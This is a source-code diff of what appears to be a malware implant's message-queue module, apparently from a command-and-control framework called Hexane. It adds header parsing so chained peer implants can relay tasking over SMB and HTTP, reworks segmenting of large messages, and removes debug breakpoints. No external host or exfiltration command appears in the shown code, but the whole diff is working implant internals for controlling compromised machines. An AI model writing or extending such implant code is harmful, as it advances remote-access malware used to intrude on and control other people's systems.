@@ -24,7 +24,6 @@ namespace Message {
     VOID AddMessage(PSTREAM Outbound) {
         HEXANE
 
-        __debugbreak();
         PSTREAM Head = Ctx->Transport.OutboundQueue;
 
         if (!Ctx->Transport.OutboundQueue) {
@@ -42,7 +41,6 @@ namespace Message {
     VOID ClearQueue() {
         HEXANE
 
-        __debugbreak();
         PSTREAM Head = Ctx->Transport.OutboundQueue;
         PSTREAM Swap = { };
         PSTREAM Prev = { };
@@ -76,6 +74,11 @@ namespace Message {
 
     VOID OutboundQueue(PSTREAM Outbound) {
         HEXANE
+        // all implants in the chain must use the same key, else could not parse headers
+        // only the server needs a length?
+
+        PARSER Parser   = { };
+        PSTREAM Queue   = { };
 
         if (!Outbound) {
             return_defer(ERROR_NO_DATA);
@@ -83,8 +86,23 @@ namespace Message {
 
         if (Outbound->Length > MESSAGE_MAX) {
             QueueSegments(B_PTR(Outbound->Buffer), Outbound->Length);
+
         } else {
-            AddMessage(Outbound);
+            Parser::CreateParser(&Parser, B_PTR(Outbound->Buffer), Outbound->Length);
+            Queue = Stream::CreateStream();
+
+            Queue->PeerId   = Parser::UnpackDword(&Parser);
+            Queue->TaskId   = Parser::UnpackDword(&Parser);
+            Queue->MsgType  = Parser::UnpackDword(&Parser);
+
+            Queue->Length   = Parser.Length;
+            Queue->Buffer   = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, Queue->Buffer, Parser.Length);
+
+            x_memcpy(Queue->Buffer, Parser.Buffer, Parser.Length);
+            AddMessage(Queue);
+
+            Parser::DestroyParser(&Parser);
+            Stream::DestroyStream(Outbound);
         }
 
         defer:
@@ -93,7 +111,7 @@ namespace Message {
     VOID QueueSegments(PBYTE Buffer, ULONG Length) {
         HEXANE
 
-        PSTREAM Swap    = { };
+        PSTREAM Queue    = { };
         ULONG Index     = 1;
         ULONG Offset    = 0;
         ULONG PeerId    = 0;
@@ -103,63 +121,69 @@ namespace Message {
 
         while (Length > 0) {
             cbSeg   = (Length > MESSAGE_MAX - SEGMENT_HEADER_SIZE) ? MESSAGE_MAX - SEGMENT_HEADER_SIZE : Length;
-            Swap    = (PSTREAM) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, cbSeg + SEGMENT_HEADER_SIZE);
+            Queue    = (PSTREAM) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, cbSeg + SEGMENT_HEADER_SIZE);
 
             x_memcpy(&PeerId, Buffer, 4);
             x_memcpy(&TaskId, Buffer + 4, 4);
 
-            Stream::PackDword(Swap, PeerId);
-            Stream::PackDword(Swap, TaskId);
-            Stream::PackDword(Swap, TypeSegment);
+            Queue->PeerId    = PeerId;
+            Queue->TaskId    = TaskId;
+            Queue->MsgType   = TypeSegment;
 
-            Stream::PackDword(Swap, Index);
-            Stream::PackDword(Swap, nSegs);
-            Stream::PackDword(Swap, cbSeg);
-            Stream::PackBytes(Swap, B_PTR(Buffer) + Offset, cbSeg);
+            Stream::PackDword(Queue, Index);
+            Stream::PackDword(Queue, nSegs);
+            Stream::PackDword(Queue, cbSeg);
+            Stream::PackBytes(Queue, B_PTR(Buffer) + Offset, cbSeg);
 
             Index++;
             Length -= cbSeg;
             Offset += cbSeg;
 
-            AddMessage(Swap);
+            AddMessage(Queue);
         }
     }
 
     VOID MessageTransmit() {
         HEXANE
 
-        PSTREAM Outbound    = Stream::CreateStreamWithHeaders(TypeResponse);
+        PSTREAM Outbound    = { };
         PSTREAM Inbound     = { };
         PSTREAM Head        = { };
         PSTREAM Swap        = { };
 
         if (!Ctx->Transport.OutboundQueue->Buffer) {
-
-#ifdef TRANSPORT_HTTP
-            // Stream::PackDword(Outbound, 0);
+#ifdef TRANSPORT_SMB
+            return_defer(ERROR_SUCCESS);
+#endif
             Stream::PackDword(Outbound, Ctx->Session.PeerId);
             Stream::PackDword(Outbound, Ctx->Session.CurrentTaskId);
             Stream::PackDword(Outbound, TypeTasking);
-#else
-            return_defer(ERROR_SUCCESS);
-#endif
-        }
 
-        Head = Ctx->Transport.OutboundQueue;
-        while (Head) {
-            if ((Head->Length + Outbound->Length) > MESSAGE_MAX) {
-                break;
-            }
+        } else {
+            // Implants that receive messages from peers must parse the header themselves.
+            // Pid, Tid and Type need to be saved and the remaining buffer can be re-packaged with new header
 
-            if (Head->Buffer) {
-                Stream::PackBytes(Outbound, B_PTR(Head->Buffer), Head->Length);
-                Head->Ready = TRUE;
-            }
-            else {
-                return_defer(ERROR_NO_DATA);
-            }
+            Outbound = Stream::CreateStream();
+            Head = Ctx->Transport.OutboundQueue;
 
-            Head = Head->Next;
+            while (Head) {
+                if (Head->Length + Outbound->Length > MESSAGE_MAX) {
+                    break;
+                }
+
+                if (Head->Buffer) {
+                    Stream::PackDword(Outbound, Head->PeerId);
+                    Stream::PackDword(Outbound, Head->TaskId);
+                    Stream::PackDword(Outbound, Head->MsgType);
+                    Stream::PackBytes(Outbound, B_PTR(Head->Buffer), Head->Length);
+                    Head->Ready = TRUE;
+                }
+                else {
+                    return_defer(ERROR_NO_DATA);
+                }
+
+                Head = Head->Next;
+            }
         }
 
 #ifdef TRANSPORT_HTTP
@@ -178,8 +202,8 @@ namespace Message {
             if (PeekPID(Inbound)) {
                 CommandDispatch(Inbound);
                 Stream::DestroyStream(Inbound);
-
-            } else {
+            }
+            else {
                 Swap = Inbound;
                 Inbound = Outbound;
                 Outbound = Swap;
@@ -194,7 +218,8 @@ namespace Message {
 
                 Stream::DestroyStream(Outbound);
             }
-        } else {
+        }
+        else {
             Head = Ctx->Transport.OutboundQueue;
 
             while (Head) {
@@ -203,7 +228,8 @@ namespace Message {
             }
         }
 
-        defer:
+    defer:
+
     }
 
     VOID CommandDispatch (PSTREAM Inbound) {
